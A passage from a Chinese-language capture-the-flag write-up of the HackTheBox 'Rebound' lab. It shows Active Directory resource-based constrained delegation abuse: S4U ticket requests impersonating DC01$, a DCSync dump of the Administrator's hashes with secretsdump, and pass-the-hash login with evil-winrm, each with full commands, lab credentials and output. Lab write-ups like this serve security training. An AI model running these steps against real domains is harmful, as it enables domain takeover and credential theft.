[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)
```

+ **Check configured RBCD**

powerview登陆oorend用户查看msDS-AllowedToActOnBehalfOfOtherIdentity的值已经被写入。

```
PV > Get-DomainObject -Identity delegator$
```

```
objectClass                                  : top
                                               person
                                               organizationalPerson
                                               user
                                               computer
                                               msDS-GroupManagedServiceAccount
cn                                           : delegator
distinguishedName                            : CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb
instanceType                                 : 4
name                                         : delegator
objectGUID                                   : {c9da97ae-5e35-44d2-aa15-114aecdc0caf}
userAccountControl                           : WORKSTATION_TRUST_ACCOUNT [4096]
badPwdCount                                  : 0
badPasswordTime                              : 09/09/2024
lastLogoff                                   : 0
lastLogon                                    : 09/09/2024
localPolicyFlags                             : 0
pwdLastSet                                   : 09/09/2024
primaryGroupID                               : 515
objectSid                                    : S-1-5-21-4078382237-1492182817-2568127209-7687
accountExpires                               : 9223372036854775807
logonCount                                   : 15
sAMAccountName                               : delegator$
sAMAccountType                               : 805306369
dNSHostName                                  : gmsa.rebound.htb
servicePrincipalName                         : browser/dc01.rebound.htb
objectCategory                               : CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=rebound,DC=htb
isCriticalSystemObject                       : FALSE
lastLogonTimestamp                           : 09/09/2024
msDS-AllowedToDelegateTo                     : http/dc01.rebound.htb
msDS-SupportedEncryptionTypes                : RC4-HMAC
                                               AES128
                                               AES256
msDS-AllowedToActOnBehalfOfOtherIdentity     : AQAEgEAAAAAAAAAAAAAAABQAAAAEACwAAQAAAAAAJAD/AQ8AAQUAAAAAAAUVAAAAnSwX8yHn8FjpghKZAR4AAAECAAAAAAAFIAAA
                                               ACACAAA=
msDS-ManagedPasswordId                       : AQAAAEtEU0sCAAAAagEAABUAAAAOAAAAqozXLXGPzBuv4FrBregFhwAAAAAYAAAAGAAAAHIAZQBiAG8AdQBuAGQALgBoAHQAYgAA
                                               AHIAZQBiAG8AdQBuAGQALgBoAHQAYgAAAA==
msDS-ManagedPasswordPreviousId               : AQAAAEtEU0sCAAAAagEAABMAAAAGAAAAqozXLXGPzBuv4FrBregFhwAAAAAYAAAAGAAAAHIAZQBiAG8AdQBuAGQALgBoAHQAYgAA
                                               AHIAZQBiAG8AdQBuAGQALgBoAHQAYgAAAA==
msDS-ManagedPasswordInterval                 : 30
msDS-GroupMSAMembership                      : S-1-5-21-4078382237-1492182817-2568127209-7686
```

也可以通过impacket-findDelegation

```
impacket-findDelegation rebound.htb/oorend:'1GR8t@$$4u' -dc-ip dc01.rebound.htb -k 
```

```
[*] Getting machine hostname
[-] CCache file is not found. Skipping...
AccountName  AccountType                          DelegationType  DelegationRightsTo    
-----------  -----------------------------------  --------------  ---------------------
ldap_monitor  Person                               Resource-Based Constrained  delegator$         
delegator$    ms-DS-Group-Managed-Service-Account  Constrained                 http/dc01.rebound.htb 
```

![image-20240909135658711](D:\markdown images\image-20240909135658711.png)

+ **Choose impersonate user**

基于资源的约束委派要求被委派的用户的`userAccountControl`属性未配置`NOT_DELEGATED`属性。

在powerview中通过oorend用户查看Administrator，发现`userAccountControl`属性值为`NOT_DELEGATED`，那么就不能替Administrator进行约束委派。

那么，我们可以尝试模拟DC上的`DC01`账户。

```
(LDAPS)-[dc01.rebound.htb]-[rebound\oorend]
PV > Get-DomainUser -Identity Administrator
cn                                : Administrator
description                       : Built-in account for administering the computer/domain
distinguishedName                 : CN=Administrator,CN=Users,DC=rebound,DC=htb
memberOf                          : CN=Group Policy Creator Owners,CN=Users,DC=rebound,DC=htb
                                    CN=Domain Admins,CN=Users,DC=rebound,DC=htb
                                    CN=Enterprise Admins,CN=Users,DC=rebound,DC=htb
                                    CN=Schema Admins,CN=Users,DC=rebound,DC=htb
                                    CN=Administrators,CN=Builtin,DC=rebound,DC=htb
name                              : Administrator
objectGUID                        : {37857665-6e2e-4f12-9976-5c9babcd8282}
userAccountControl                : NORMAL_ACCOUNT [1114624]
                                    DONT_EXPIRE_PASSWORD
                                    NOT_DELEGATED
badPwdCount                       : 0
badPasswordTime                   : 08/25/2023
lastLogoff                        : 0
lastLogon                         : 09/09/2024
pwdLastSet                        : 04/08/2023
primaryGroupID                    : 513
objectSid                         : S-1-5-21-4078382237-1492182817-2568127209-500
adminCount                        : 1
sAMAccountName                    : Administrator
sAMAccountType                    : 805306368
objectCategory                    : CN=Person,CN=Schema,CN=Configuration,DC=rebound,DC=htb
```

+ **Impersonate DC01$**

ldap_monitor替`DC01$`向`delegator$`的`browser`服务进行基于资源的约束委派，成功获取到可转发的ST。

```
impacket-getST rebound.htb/ldap_monitor:'1GR8t@$$4u' -spn browser/dc01.rebound.htb -impersonate DC01$
```

```
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC01$
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in DC01$.ccache
```

可以通过impacket-describeTicket验证票据是可转发的。

> S4U2proxy请求得到的ticket都是可转发的

```
┌──(root㉿kali)-[~/…/htb/rebound/impacket/examples]
└─# python describeTicket.py ~/DC01\$.ccache 
[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : 5df0ecdb20e685505c3646069921a553
[*] User Name                     : DC01$
[*] User Realm                    : rebound.htb
[*] Service Name                  : browser/dc01.rebound.htb
[*] Service Realm                 : REBOUND.HTB
[*] Start Time                    : 09/09/2024 21:05:18 PM
[*] End Time                      : 10/09/2024 07:05:18 AM
[*] RenewTill                     : 10/09/2024 21:02:04 PM
[*] Flags                         : (0x40a10000) forwardable, renewable, pre_authent, enc_pa_rep
[*] KeyType                       : rc4_hmac
[*] Base64(key)                   : XfDs2yDmhVBcNkYGmSGlUw==
[*] Kerberoast hash               : $krb5tgs$18$USER$REBOUND.HTB$*browser/dc01.rebound.htb*$1d79b414e92e73fcf636a1dd$5535d4cbf47d8d325e8a9da42624318f27a10fd7001d4c4e...
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : browser/dc01.rebound.htb
[*]   Service Realm               : REBOUND.HTB
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```

而如果尝试替Administrator进行约束委派，得到的结果如下。

```
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user ldap_monitor or initial TGT not forwardable
```



### 9.3 S4U2Proxy with forwardable ST

得到了DC01对delegator的可转发ST后，就可以直接将这个ST作为additional ticket，由delegator替`DC01`向SPN为http的服务请求ST。

```sh
impacket-getST rebound.htb/delegator\$ -hashes :f7f7ea94cd22bd4129ca00bab335ceb9 -spn http/dc01.rebound.htb -additional-ticket ~/DC01\$.ccache -impersonate DC01$
```

```
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC01$
[*]     Using additional ticket /root/DC01$.ccache instead of S4U2Self
[*]     Requesting S4U2Proxy
[*] Saving ticket in DC01$.ccache
```



## 10. Administrator Secret Dump

将DC01的ST作为凭据，使用` impacket-secretsdump`导出Administrator的密码。

```sh
KRB5CCNAME=./DC01\$.ccache impacket-secretsdump -k -no-pass dc01.rebound.htb -just-dc-user administrator
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:32fd2c37d71def86d7687c95c62395ffcbeaf13045d1779d6c0b95b056d5adb1
Administrator:aes128-cts-hmac-sha1-96:efc20229b67e032cba60e05a6c21431f
Administrator:des-cbc-md5:ad8ac2a825fe1080
[*] Cleaning up... 
```

此命令也可以导出全部账户的NTLM哈希值，参考https://fdlucifer.github.io/2024/04/01/rebound/。

```
KRB5CCNAME='DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache' secretsdump.py -no-pass -k dc01.rebound.htb -just-dc-ntlm
```



使用evil-winrm进行pth，登录到administrator。其中`-i`是指定ip地址。

```
evil-winrm -i dc01 -u administrator -H 176be138594933bb67db3b2572fc91b8
```

![image-20240909145639713](D:\markdown images\image-20240909145639713.png)



## References



1. https://0xdf.gitlab.io/2024/03/30/htb-rebound.html
2. https://arth0s.medium.com/hackthebox-rebound-write-up-insane-ab8eb3679bff
3. https://www.semperis.com/blog/new-attack-paths-as-requested-sts/
































